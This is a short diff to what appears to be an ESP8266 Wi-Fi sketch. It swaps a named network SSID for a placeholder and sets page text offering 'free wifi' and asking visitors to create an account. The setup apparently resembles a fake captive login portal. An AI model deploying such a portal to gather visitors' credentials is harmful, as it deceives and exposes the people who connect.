@@ -7,7 +7,7 @@
 #include <ESP8266WebServer.h>
 
 // User configuration
-#define SSID_NAME "Unnamalai 5G"
+#define SSID_NAME "........." //give your custom ssid
 #define SUBTITLE "Welcome to free wifi service."
 #define TITLE "Register:"
 #define BODY "Create an account to get connected to the internet."
